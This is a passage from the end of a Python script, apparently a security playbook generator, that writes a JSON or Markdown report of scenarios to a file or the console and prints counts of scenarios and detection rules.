    if args.format == "json":
        report = generate_json_report(scenarios)
    else:
        report = generate_markdown_report(scenarios)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(report)
        print(f"[+] Playbook written to: {args.output}")
        print(f"[+] Format: {args.format.upper()}")
        print(f"[+] Scenarios: {len(scenarios)}")
        total_rules = sum(
            len(r) for s in scenarios for step in s.steps for r in [step.detection_rules]
        )
        print(f"[+] Detection rules: {total_rules}")
    else:
        print(report)


if __name__ == "__main__":
    main()
